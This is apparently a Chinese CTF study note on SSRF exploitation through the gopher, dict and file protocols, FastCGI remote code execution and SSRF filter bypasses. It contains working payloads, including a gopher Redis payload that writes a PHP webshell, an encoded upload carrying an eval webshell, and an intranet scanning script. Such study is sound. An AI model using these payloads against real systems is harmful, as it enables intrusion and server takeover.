http是访问本地的html文件，相当于把本机当作http服务器，通过http访问服务器，服务器再去访问本地资源。简单来说file只能静态读取，http可以动态解析 http服务器可以开放端口，让他人通过http访问服务器资源，但file不可以 file对应的类似http的协议是ftp协议（文件传输协议） file不能跨域 Gopher协议协议简介gopher 协议是一个在http 协议诞生前用来访问Internet 资源的协议可以理解为http协议的前身或简化版，虽然很古老但现在很多库还支持gopher 协议而且gopher 协议功能很强大。它可以实现多个数据包整合发送，然后gopher 服务器将多个数据包捆绑着发送到客户端，这就是它的菜单响应。比如使用一条gopher 协议的curl 命令就能操作mysql 数据库或完成对redis 的攻击等等。gopher 协议使用tcp 可靠连接。 gopher协议是比http协议更早出现的协议，现在已经不常用了，但是在SSRF漏洞利用中gopher可以说是万金油，因为可以使用gopher发送各种格式的请求包，这样就可以解决漏洞点不在GET参数的问题了。 协议格式URL:gopher:&#x2F;&#x2F;&lt;host&gt;:&lt;port&gt;&#x2F;&lt;gopher-path&gt;_后接TCP数据流 gopher的默认端口是70 如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&amp;也需要进行URL编码 &lt;gopher-path&gt;其中&lt;gopher-path&gt;格式可以是如下其中的一种&lt;/gopher-path&gt;,当然，这部分也可以省略 &lt;gophertype&gt;&lt;selector&gt; &lt;gophertype&gt;&lt;selector&gt;%09&lt;search&gt; &lt;gophertype&gt;&lt;selector&gt;%09&lt;search&gt;%09&lt;gopher+_string&gt; 整个&lt;gopher-path&gt;部分可以省略，这时候\\也可以省略&lt;gophertype&gt;为默认的1。&lt;gophertype&gt;是一个单字符用来表示url 资源的类型，在常用的安全测试中发现不管这个字符是什么都不影响，只要有就行了。&lt;selector&gt;个人理解这个是包的内容，为了避免一些特殊符号需要进行url 编码，但如果直接把wireshark 中ascii 编码的数据直接进行url 编码然后丢到gopher 协议里跑会出错，得在wireshark 里先换成hex 编码的原始数据后再每两个字符的加上%，通过对比发现直接url 编码的话会少了%0d回车字符。&lt;search&gt;用于向gopher 搜索引擎提交搜索数据，和&lt;selector&gt;之间用%09隔开。&lt;gopher+_string&gt;是获取gopher+ 项所需的信息，gopher+ 是gopher 协议的升级版。 先试一下 vps上监听5001端口，然后在另一台上利用gopher发送请求 发现虽然发送的请求是abcd但是接收的只有bcd 这是因为用一个单字符表示了&lt;gophertype&gt;部分 构造get请求网页代码为 &lt;?php echo &quot;Hello &quot;.$_REQUEST[&quot;name&quot;].&quot;\\n&quot; ?&gt; get的请求方式就是 curl gopher:&#x2F;&#x2F;ip:80&#x2F;_GET%20&#x2F;ssrf&#x2F;test&#x2F;test.php%3fname&#x3D;Margin%20HTTP&#x2F;1.1%0d%0AHost:%20ip%0d%0A 构造post请求curl gopher:&#x2F;&#x2F;ip:80&#x2F;_POST%20&#x2F;ssrf&#x2F;test&#x2F;test.php%20HTTP&#x2F;1.1%0d%0AHost:ip%0d%0AContent-Type:application&#x2F;x-www-form-urlencoded%0d%0AContent-Length:11%0d%0A%0d%0Aname&#x3D;Margin%0d%0A 与get不同的地方就是要加上Content-Type和Content-Length Gopher与get shell首先准备一个有ssrf漏洞的代码 先试一下 那我们能不能用这个代码来读到我们test.php里的内容呢 curl http:&#x2F;&#x2F;ip&#x2F;ssrf&#x2F;test&#x2F;shell.php?url&#x3D;gopher:&#x2F;&#x2F;ip:80&#x2F;_GET%20&#x2F;ssrf&#x2F;test&#x2F;test.php%3fname&#x3D;Margin%20HTTP&#x2F;1.1%0d%0AHost:%20ip%0d%0A 构造这样的payload，但是发现并没有回显出test.php里的内容 这里是因为在PHP在接收到参数后会做一次URL的解码，%20等字符已经被转码为空格。所以，curl_exec在发起gopher时用的就是没有进行URL编码的值，就导致了现在的情况，所以我们要进行二次URL编码。 curl http:&#x2F;&#x2F;ip&#x2F;ssrf&#x2F;test&#x2F;shell.php?url&#x3D;gopher%3A%2F%2Fip%3A80%2F_GET%2520%2Fssrf%2Ftest%2Ftest.php%253fname%3DMargin%2520HTTP%2F1.1%250d%250AHost%3A%2520ip%250d%250A 成功利用 剩下的部分搭环境比较麻烦，而且还有的涉及到Java的框架了，不想搭了（瘫，直接贴链接了 https://xz.aliyun.com/t/6993 Gopher协议在SSRF漏洞中的深入研究（附视频讲解） - 知乎 (zhihu.com) DICT协议定义词典网络协议，在RFC 2009中进行描述。它的目标是超越Webster protocol，并允许客户端在使用过程中访问更多字典。Dict服务器和客户机使用TCP端口2628。 使用 dictd 搭建 DICT 字典服务器 | wzyboy’s blog 利用dict:&#x2F;&#x2F;127.0.0.1:端口&#x2F; 用nc在测试机监听，然后利用ssrf漏洞测试一下dict协议发送字符串info，看看接收方会收到什么： 可以看到一共收到了三行数据，第一行是版本号，第二行是我们发送的数据，第三行是自动添加的QUIT。 成功看到了mysql数据库的版本号 可以利用dict进行指纹识别 FastCGI这部分不是很熟，直接上参考文章了 https://www.modb.pro/db/163739 什么是FastCGI在网站架构中，Web Server（如Nginx）只是内容的分发者 当客户端请求的是index.php，根据配置文件Web Server辨别不是静态文件，此时就需要去找 PHP解析器来处理 当Web Server收到 index.php 这个请求后，会启动对应的CGI 程序，也就是PHP解析器 接下来PHP解析器会解析php.ini文件，初始化执行环境，然后处理请求，再以CGI规范的格式返回处理后的结果，退出进程，Web server再把结果返回给浏览器。这就是一个完整的动态PHP Web访问流程 CGI： 是 Web Server 与 Web Application 之间 数据交换的一种协议 FastCGI： 同 CGI，是一种通信协议，对比 CGI 提升了5倍以上性能 PHP-CGI： 是 PHP（Web Application）对 Web Server 提供的 CGI 协议的接口程序 PHP-FPM： 是 PHP（Web Application）对 Web Server 提供的 FastCGI 协议的接口程序，额外还提供了相对智能的任务管理功能 PHP默认提供了很多种SAPI（服务器端应用编程端口），常见的提供给apache和nginx的php5_module、CGI、FastCGI，给IIS的ISAPI，以及Shell的CLI 经过不断的技术升级，目前搭建高性能的PHP Web服务器，最佳的方式是Apache/Nginx + FastCGI + **PHP-FPM(PHP-CGI)**方式 工作原理 Web 服务器启动时载入FastCGI进程管理器（PHP-CGI或者PHP-FPM) FastCGI 进程管理器自身初始化，启动多个 CGI 解释器进程，并等待来自 Web Server 的连接 Web 服务器与 FastCGI 进程管理器进行 Socket 通信，选择一个CGI 解释器进程，通过 FastCGI 协议发送 CGI 环境变量和标准输入数据给 这个CGI 解释器进程 CGI 解释器进程完成处理后将标准输出和错误信息从同一连接返回 Web 服务器 CGI 解释器进程接着等待并处理来自 Web 服务器的下一个连接 由此，PHP-FPM 就是一个FastCGI进程管理器，是对于 FastCGI 协议的具体实现，它负责管理一个进程池，来处理来自Web服务器的请求。 PHP-FPM通信方式在PHP使用FastCGI连接模式的情况下，Web服务器中间件如Nginx和PHP-FPM之间的通信方式又分为两种，TCP模式和套接字(unix socket)模式 TCP模式即是PHP-FPM进程会监听本机上的一个端口（默认为9000），然后Nginx会把客户端请求数据通过FastCGI协议传给9000端口，PHP-FPM拿到数据后会调用CGI进程解析 Unix套接字模式是Unix系统进程间通信（IPC）的一种被广泛采用方式，以文件（一般是.sock）作为socket的唯一标识（描述符），需要通信的两个进程引用同一个socket描述符文件就可以建立通道进行通信了。上述原理图中提到的Socket 通信即为此模式 ssrf中对FastCGI的攻击是利用了TCP模式 FastCGI攻击FastCGI协议HTTP协议是浏览器和服务器中间件进行数据交换的协议，类比HTTP协议来说，fastcgi协议则是服务器中间件和某个语言后端（如PHP-FPM）进行数据交换的协议 Fastcgi协议由多个record组成，record也有header和body一说，服务器中间件将这二者按照fastcgi的规则封装好发送给语言后端（PHP-FPM），语言后端（PHP-FPM）解码以后拿到具体数据，进行指定操作，并将结果再按照该协议封装好后返回给服务器中间件 record的头固定8个字节，body是由头中的contentLength指定，其结构如下： typedef struct &#123; &#x2F;* Header *&#x2F; unsigned char version; &#x2F;&#x2F; 版本 unsigned char type; &#x2F;&#x2F; 本次record的类型 unsigned char requestIdB1; &#x2F;&#x2F; 本次record对应的请求id unsigned char requestIdB0; unsigned char contentLengthB1; &#x2F;&#x2F; body体的大小 unsigned char contentLengthB0; unsigned char paddingLength; &#x2F;&#x2F; 额外块大小 unsigned char reserved; &#x2F;* Body *&#x2F; unsigned char contentData[contentLength]; unsigned char paddingData[paddingLength]; &#125; FCGI_Record; 语言端（PHP-FPM）解析了fastcgi头以后，拿到contentLength，然后再在TCP流里读取大小等于contentLength的数据，这就是body体 Body后面还有一段额外的数据（Padding），其长度由头中的paddingLength指定，起保留作用 不需要该Padding的时候，将其长度设置为0即可 可见，一个fastcgi record结构最大支持的body大小是2^16 ，也就是65536字节 其中，header中的type代表本次record的类型，所有值及具体含义如下 服务器中间件和后端语言通信，第一个数据包就是type为1的record，后续互相交流，发送type为4、5、6、7的record，结束时发送type为2、3的record。 这里着重讲一下type为4，当后端语言接收到一个 type 为4的 Record 后，就会把这个 Record 的 Body 按照对应的结构解析成 key-value 对，结构如下： typedef struct &#123; unsigned char nameLengthB0; &#x2F;* nameLengthB0 &gt;&gt; 7 &#x3D;&#x3D; 0 *&#x2F; unsigned char valueLengthB0; &#x2F;* valueLengthB0 &gt;&gt; 7 &#x3D;&#x3D; 0 *&#x2F; unsigned char nameData[nameLength]; unsigned char valueData[valueLength]; &#125; FCGI_NameValuePair11; typedef struct &#123; unsigned char nameLengthB0; &#x2F;* nameLengthB0 &gt;&gt; 7 &#x3D;&#x3D; 0 *&#x2F; unsigned char valueLengthB3; &#x2F;* valueLengthB3 &gt;&gt; 7 &#x3D;&#x3D; 1 *&#x2F; unsigned char valueLengthB2; unsigned char valueLengthB1; unsigned char valueLengthB0; unsigned char nameData[nameLength]; unsigned char valueData[valueLength ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0]; &#125; FCGI_NameValuePair14; typedef struct &#123; unsigned char nameLengthB3; &#x2F;* nameLengthB3 &gt;&gt; 7 &#x3D;&#x3D; 1 *&#x2F; unsigned char nameLengthB2; unsigned char nameLengthB1; unsigned char nameLengthB0; unsigned char valueLengthB0; &#x2F;* valueLengthB0 &gt;&gt; 7 &#x3D;&#x3D; 0 *&#x2F; unsigned char nameData[nameLength ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0]; unsigned char valueData[valueLength]; &#125; FCGI_NameValuePair41; typedef struct &#123; unsigned char nameLengthB3; &#x2F;* nameLengthB3 &gt;&gt; 7 &#x3D;&#x3D; 1 *&#x2F; unsigned char nameLengthB2; unsigned char nameLengthB1; unsigned char nameLengthB0; unsigned char valueLengthB3; &#x2F;* valueLengthB3 &gt;&gt; 7 &#x3D;&#x3D; 1 *&#x2F; unsigned char valueLengthB2; unsigned char valueLengthB1; unsigned char valueLengthB0; unsigned char nameData[nameLength ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0]; unsigned char valueData[valueLength ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0]; &#125; FCGI_NameValuePair44; 这其实是 4 个结构，至于用哪个结构，有如下规则： key、value均小于128字节，用 FCGI_NameValuePair11 key大于128字节，value小于128字节，用 FCGI_NameValuePair41 key小于128字节，value大于128字节，用 FCGI_NameValuePair14 key、value均大于128字节，用 FCGI_NameValuePair44 举个例子，用户访问http://127.0.0.1/index.php?a=1&amp;b=2如果web目录是/var/www/html那么服务器中间件（Nginx）会将这个请求变成如下key-value对： &#123; &#39;GATEWAY_INTERFACE&#39;: &#39;FastCGI&#x2F;1.0&#39;, &#39;REQUEST_METHOD&#39;: &#39;GET&#39;, &#39;SCRIPT_FILENAME&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;, &#39;SCRIPT_NAME&#39;: &#39;&#x2F;index.php&#39;, &#39;QUERY_STRING&#39;: &#39;?a&#x3D;1&amp;b&#x3D;2&#39;, &#39;REQUEST_URI&#39;: &#39;&#x2F;index.php?a&#x3D;1&amp;b&#x3D;2&#39;, &#39;DOCUMENT_ROOT&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#39;, &#39;SERVER_SOFTWARE&#39;: &#39;php&#x2F;fcgiclient&#39;, &#39;REMOTE_ADDR&#39;: &#39;127.0.0.1&#39;, &#39;REMOTE_PORT&#39;: &#39;12345&#39;, &#39;SERVER_ADDR&#39;: &#39;127.0.0.1&#39;, &#39;SERVER_PORT&#39;: &#39;80&#39;, &#39;SERVER_NAME&#39;: &quot;localhost&quot;, &#39;SERVER_PROTOCOL&#39;: &#39;HTTP&#x2F;1.1&#39; &#125; 这个数组其实就是PHP中$_SERVER数组的一部分，也就是PHP里的环境变量。但环境变量的作用不仅是填充$_SERVER数组，也是告诉FPM：“我要执行哪个PHP文件” 当后端语言（PHP-FPM）拿到由Nginx发过来的FastCGI数据包后，进行解析，得到上述这些环境变量。然后，执行SCRIPT_FILENAME的值指向的PHP文件，也就是/var/www/html/index.php 漏洞原理PHP-FPM默认监听9000端口，如果这个端口暴露在公网，则我们可以自己构造FastCGI协议，和FPM进行通信。 所以我们如果能够自行构造SCRIPT_FILENAME的值，就能控制PHP-FPM执行任意后缀文件，如/etc/passwd 但是，在PHP5.3.9之后，FPM默认配置中增加了security.limit_extensions选项 ; Limits the extensions of the main script FPM will allow to parse. This can ; prevent configuration mistakes on the web server side. You should only limit ; FPM to .php extensions to prevent malicious users to use other extensions to ; exectute php code. ; Note: set an empty value to allow all extensions. ; Default Value: .php ;security.limit_extensions &#x3D; .php .php3 .php4 .php5 .php7 限制了只有.php后缀的文件才能够被FPM执行 因此，想利用PHP-FPM的未授权访问漏洞，首先就得找到一个已存在的PHP文件。已存在的PHP文件名获得有两种方法： 通过系统的信息收集、爆破、报错获得某个PHP文件名及其路径 找安装PHP后默认存在的PHP文件，如/usr/local/lib/php/PEAR.php 现在，拿到了文件名，我们能控制SCRIPT_FILENAME，却只能执行目标服务器上的文件，并不能执行我们想要执行的任意代码，但我们可以通过构造type值为4的record，也就是设置向PHP-FPM传递的环境变量来达到任意代码执行的目的 在PHP.INI中有两个配置项，auto_prepend_file和auto_append_file。 auto_prepend_file是告诉PHP，在执行目标文件之前，先包含auto_prepend_file中指定的文件； auto_append_file是告诉PHP，在执行完成目标文件后，包含auto_append_file指向的文件。 若我们设置auto_prepend_file为php://input（allow_url_include=on），那么就等于在执行任何PHP文件前都要包含一遍POST的内容。所以，我们只需要把待执行的代码放在FastCGI协议 Body中，它们就能被执行了 而这就要利用后端语言（PHP-FPM）拿到由Nginx发过来的FastCGI数据包后，进行解析，得到的环境变量了。 在其中有PHP_VALUE和PHP_ADMIN_VALUE两个特殊的值 所以我们只要将环境变量构造成 &#123; &#39;GATEWAY_INTERFACE&#39;: &#39;FastCGI&#x2F;1.0&#39;, &#39;REQUEST_METHOD&#39;: &#39;GET&#39;, &#39;SCRIPT_FILENAME&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;, &#39;SCRIPT_NAME&#39;: &#39;&#x2F;index.php&#39;, &#39;QUERY_STRING&#39;: &#39;?a&#x3D;1&amp;b&#x3D;2&#39;, &#39;REQUEST_URI&#39;: &#39;&#x2F;index.php?a&#x3D;1&amp;b&#x3D;2&#39;, &#39;DOCUMENT_ROOT&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#39;, &#39;SERVER_SOFTWARE&#39;: &#39;php&#x2F;fcgiclient&#39;, &#39;REMOTE_ADDR&#39;: &#39;127.0.0.1&#39;, &#39;REMOTE_PORT&#39;: &#39;12345&#39;, &#39;SERVER_ADDR&#39;: &#39;127.0.0.1&#39;, &#39;SERVER_PORT&#39;: &#39;80&#39;, &#39;SERVER_NAME&#39;: &quot;localhost&quot;, &#39;SERVER_PROTOCOL&#39;: &#39;HTTP&#x2F;1.1&#39; &#39;PHP_VALUE&#39;: &#39;auto_prepend_file &#x3D; php:&#x2F;&#x2F;input&#39;, &#39;PHP_ADMIN_VALUE&#39;: &#39;allow_url_include &#x3D; On&#39; &#125; 就能实现rce的目的 ctf中一般的利用条件 PHP版本要高于5.3.3，才能动态修改PHP.INI配置文件 知道题目环境中的一个PHP文件的绝对路径 PHP-FPM监听在本机9000端口 例题参考 陇原战役复现 | Ethe&#39;s blog (ethe448.github.io) 一些绕过对于SSRF的限制大致有如下几种： 限制请求的端口只能为Web端口，只允许访问HTTP和HTTPS的请求。 限制域名只能为http://www.xxx.com 限制不能访问内网的IP，以防止对内网进行攻击。 屏蔽返回的详细信息。 利用HTTP基本身份认证的方式绕过如果目标代码限制访问的域名只能为 http://www.xxx.com ，那么我们可以采用HTTP基本身份认证的方式绕过。即@：http://www.xxx.com@www.evil.com 本地回环地址的其他表现形式127.0.0.1，通常被称为本地回环地址(Loopback Address)，指本机的虚拟接口，一些表示方法如下(ipv6的地址使用http访问需要加[])： http://127.0.0.1http://localhosthttp://127.255.255.254127.0.0.1 - 127.255.255.254http://[::1]http://[::ffff:7f00:1]http://[::ffff:127.0.0.1]http://127.1http://127.0.1http://0:80 IP的进制转换IP地址是一个32位的二进制数，通常被分割为4个8位二进制数。通常用“点分十进制”表示成（a.b.c.d）的形式，所以IP地址的每一段可以用其他进制来转换。使用如win系统自带的计算机（程序员模式）就可简单实现IP地址的进制转换。 由于一些系统会直接提取邮件中内嵌的链接进行检测，而一种此类URL混淆技术采用了URL主机名部分中使用的编码十六进制IP地址格式来逃避检测。 由于IP地址可以用多种格式表示，因此可以在URL中如下所示使用： 点分十进制IP地址：http://127.0.0.1 八进制IP地址：http://0177.0.0.1（将每个十进制数字转换为八进制） 十六进制IP地址：http://0x7F000001或者http://0x7F.0.0.1（将每个十进制数字转换为十六进制） 整数或DWORD IP地址：http://2130706433（将十六进制IP转换为整数） 白嫖个脚本 &lt;?php $ip &#x3D; &#39;127.0.0.1&#39;; $ip &#x3D; explode(&#39;.&#39;,$ip); $r &#x3D; ($ip[0] &lt;&lt; 24) | ($ip[1] &lt;&lt; 16) | ($ip[2] &lt;&lt; 8) | $ip[3] ; if($r &lt; 0) &#123; $r +&#x3D; 4294967296; &#125; echo &quot;十进制:&quot;; &#x2F;&#x2F; 2130706433 echo $r; echo &quot;八进制:&quot;; &#x2F;&#x2F; 0177.0.0.1 echo decoct($r); echo &quot;十六进制:&quot;; &#x2F;&#x2F; 0x7f.0.0.1 echo dechex($r); ?&gt; 利用302跳转绕过内网IP网络上存在一个很神奇的服务，网址为 http://xip.io，当访问这个服务的任意子域名的时候，都会重定向到这个子域名，举个例子： 当我们访问：http://127.0.0.1.xip.io/flag.php 时，实际上访问的是http://127.0.0.1/1.php 。像这种网址还有http://nip.io，http://sslip.io 。 这个我在自己的服务器上没试成功，不知道为什么 短地址跳转绕过将连接变为短链接 比如这种 宝塔方便是方便。。。但是复现漏洞的时候也太安全了，全给拦了。。。。 利用不存在的协议头绕过指定的协议头file_get_contents()函数的一个特性，即当PHP的 file_get_contents() 函数在遇到不认识的协议头时候会将这个协议头当做文件夹，造成目录穿越漏洞，这时候只需不断往上跳转目录即可读到根目录的文件。（include()函数也有类似的特性） 利用URL的解析问题可以用0.0.0.0绕过对内网ip的检测， 这个IP地址表示整个网络，可以代表本机 ipv4 的所有地址，使用如下即可绕过： 利用readfile和parse_url函数的解析差异绕过指定的端口 参考文章(4条消息) 用SSRF打穿内网_ZredamanJ的博客-CSDN博客 https://www.jianshu.com/p/a5ceccfa279a https://zhuanlan.zhihu.com/p/115222529 https://blog.csdn.net/qq_43665434/article/details/115434528 铭说｜关于SSRF和多种绕过方式 (baidu.com) (4条消息) SSRF利用 Gopher 协议拓展攻击面_BerL1n的博客-CSDN博客_gopherus使用 (4条消息) 浅谈ssrf与ctf那些事_合天网安实验室的博客-CSDN博客_ctfssrf (4条消息) SSRF in PHP_bylfsj的博客-CSDN博客 赵总这个新利用方法先放一下 基于 A 和 AAAA 记录的一种新 DNS Rebinding 姿势–从西湖论剑2020 Web HelloDiscuzQ 题对 Blackhat 上的议题做升华 – glzjin (zhaoj.in) 已经超过我的基础知识了 小tips： SSRF一般是先想办法得到目标主机的网络配置信息，如读取/etc/hosts、/proc/net/arp、/proc/net/fib_trie(存放网络适配器地址)，从而获得目标主机的内网网段并进行爆破，后面两个所需要的权限高一点，可以用file协议读一下 Linux中proc信息获取 - Yangsir34 - 博客园 (cnblogs.com) 例题[GKCTF2020]EZ三剑客-EzWeb输入www.baidu.com会出现的百度的页面 然后加一个源码里提示的secret参数，能找到这台主机的网卡配置信息，得到内网ip 10.244.80.251而且输入框内后 所以我们可以尝试利用ssrf来得到在内网其他机器上的flag 可以用file协议看看源码 过滤了file://，可以使用file:/,file: ///,file:_///绕过 file: &#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php &lt;?php function curl($url)&#123; $ch &#x3D; curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, 0); echo curl_exec($ch); curl_close($ch); &#125; if(isset($_GET[&#39;submit&#39;]))&#123; $url &#x3D; $_GET[&#39;url&#39;]; &#x2F;&#x2F;echo $url.&quot;\\n&quot;; if(preg_match(&#39;&#x2F;file\\:\\&#x2F;\\&#x2F;|dict|\\.\\.\\&#x2F;|127.0.0.1|localhost&#x2F;is&#39;, $url,$match)) &#123; &#x2F;&#x2F;var_dump($match); die(&#39;别这样&#39;); &#125; curl($url); &#125; if(isset($_GET[&#39;secret&#39;]))&#123; system(&#39;ifconfig&#39;); &#125; ?&gt; bp不知道为什么寄了，扫不了这个，只能上python了 import requests a &#x3D; [] url &#x3D; &quot;http:&#x2F;&#x2F;4a20197b-aba4-4baa-ac34-21588a8ab47b.node4.buuoj.cn:81&#x2F;index.php?url&#x3D;10.244.80.&#123;&#125;&amp;submit&#x3D;%E6%8F%90%E4%BA%A4&quot; for i in range(0,255): print(i) url1 &#x3D; url.format(i) print(url1) try: r &#x3D; requests.get(url1,timeout&#x3D;1) print(r.text) a.append(i) continue except Exception as e: print(&#39;timeout&#39;) print(a) 根据提示找找端口，再测一下发现有6379端口 说明开启着redis服务 gopherus生成个payload 改一下ip gopher:&#x2F;&#x2F;10.244.80.69:6379&#x2F;_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20system%28%27cat%20&#x2F;flag%27%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A&#x2F;var&#x2F;www&#x2F;html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A 打进去之后访问一下shell.php (这里如果直接把payload接在url的参数上需要再进行一次url编码 CTFHUB SSRF内网访问确定存在ssrf 题目说了flag在127.0.0.1的flag.php里 伪协议读取文件利用file协议读取文件 用绝对路径 端口扫描 POST要求就是给127.0.0.1的flag.php传个post参数key，key值在源码的注释里 gopher的url解码还挺玄幻的 试了几个小时，好几个网站的编码还有python和php自带的url编码的函数，但是都有点问题，最后就只有这两种成功了 http:&#x2F;&#x2F;challenge-0334eacc0c1b7b0d.sandbox.ctfhub.com:10800&#x2F;?url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:80&#x2F;_POST%2520%252Fflag.php%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Akey%253D21c12d709c44fe44f99ee5ba47501882 http:&#x2F;&#x2F;challenge-351296691c42d118.sandbox.ctfhub.com:10800&#x2F;?url&#x3D;gopher:&#x2F;&#x2F;127.0.01:80&#x2F;_POST%2520%2Fflag.php%2520HTTP%2F1.1%250d%250AHost%3A127.0.0.1%250d%250AContent-Type%3Aapplication%2Fx-www-form-urlencoded%250d%250AContent-Length%3A36%250d%250A%250d%250Akey%3D646e343c70a1b9d07661c4343b0e5e72%250d%250A 第一个是对 POST &#x2F;flag.php HTTP&#x2F;1.1 Host:127.0.0.1 Content-Type: application&#x2F;x-www-form-urlencoded Content-Length: 36 key&#x3D;646e343c70a1b9d07661c4343b0e5e72 用谷歌的hackbar上的自带的url编码进行一次编码，将换行符%0A换为%0D%0A，然后再编码一次 第二个是直接改之前测试post的时候的值 curl gopher:&#x2F;&#x2F;ip:80&#x2F;_POST%20&#x2F;ssrf&#x2F;test&#x2F;test.php%20HTTP&#x2F;1.1%0d%0AHost:ip%0d%0AContent-Type:application&#x2F;x-www-form-urlencoded%0d%0AContent-Length:11%0d%0A%0d%0Aname&#x3D;Margin%0d%0A 然后再用谷歌的hackbar进行一次编码 上传文件和post差不多吗，但是要传的是文件，所以改一下前端页面，加个提交按钮，抓包 然后直接把整个请求包改了host之后去url编码一次 POST &#x2F;flag.php HTTP&#x2F;1.1 Host: 127.0.0.1:80 Content-Length: 308 Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 Origin: http:&#x2F;&#x2F;challenge-abdf75c2760a97e9.sandbox.ctfhub.com:10800 Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryXT85fz2P3lDnY3Aw User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;100.0.4896.127 Safari&#x2F;537.36 Edg&#x2F;100.0.1185.50 Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9 Referer: http:&#x2F;&#x2F;challenge-abdf75c2760a97e9.sandbox.ctfhub.com:10800&#x2F;?url&#x3D;127.0.0.1&#x2F;flag.php Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8,en-GB;q&#x3D;0.7,en-US;q&#x3D;0.6 Connection: close ------WebKitFormBoundaryXT85fz2P3lDnY3Aw Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;1.pdf&quot; Content-Type: application&#x2F;pdf &lt;?php @eval($_POST[&quot;a&quot;]);?&gt; ------WebKitFormBoundaryXT85fz2P3lDnY3Aw Content-Disposition: form-data; name&#x3D;&quot;file&quot; æäº¤ ------WebKitFormBoundaryXT85fz2P3lDnY3Aw-- 然后再将%0a变为%0d%0a，然后再编码一次 最终payload gopher:&#x2F;&#x2F;127.0.0.1:80&#x2F;_POST%2520%252Fflag.php%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Length%253A%2520308%250D%250APragma%253A%2520no-cache%250D%250ACache-Control%253A%2520no-cache%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250AOrigin%253A%2520http%253A%252F%252Fchallenge-abdf75c2760a97e9.sandbox.ctfhub.com%253A10800%250D%250AContent-Type%253A%2520multipart%252Fform-data%253B%2520boundary%253D----WebKitFormBoundaryXT85fz2P3lDnY3Aw%250D%250AUser-Agent%253A%2520Mozilla%252F5.0%2520(Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64)%2520AppleWebKit%252F537.36%2520(KHTML%252C%2520like%2520Gecko)%2520Chrome%252F100.0.4896.127%2520Safari%252F537.36%2520Edg%252F100.0.1185.50%250D%250AAccept%253A%2520text%252Fhtml%252Capplication%252Fxhtml%252Bxml%252Capplication%252Fxml%253Bq%253D0.9%252Cimage%252Fwebp%252Cimage%252Fapng%252C*%252F*%253Bq%253D0.8%252Capplication%252Fsigned-exchange%253Bv%253Db3%253Bq%253D0.9%250D%250AReferer%253A%2520http%253A%252F%252Fchallenge-abdf75c2760a97e9.sandbox.ctfhub.com%253A10800%252F%253Furl%253D127.0.0.1%252Fflag.php%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.9%252Cen%253Bq%253D0.8%252Cen-GB%253Bq%253D0.7%252Cen-US%253Bq%253D0.6%250D%250AConnection%253A%2520close%250D%250A%250D%250A------WebKitFormBoundaryXT85fz2P3lDnY3Aw%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%25221.pdf%2522%250D%250AContent-Type%253A%2520application%252Fpdf%250D%250A%250D%250A%253C%253Fphp%2520%2540eval(%2524_POST%255B%2522a%2522%255D)%253B%253F%253E%250D%250A------WebKitFormBoundaryXT85fz2P3lDnY3Aw%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%250D%250A%250D%250A%25C3%25A6%25C2%258F%25C2%2590%25C3%25A4%25C2%25BA%25C2%25A4%250D%250A------WebKitFormBoundaryXT85fz2P3lDnY3Aw-- FastCGI协议方法一： 直接上gopherus 其中/usr/local/lib/php/PEAR.php 为安装php时默认自带的php文件 先ls /，再cat，在url中要先把这个payload的值再url编码一次，才能拿到flag 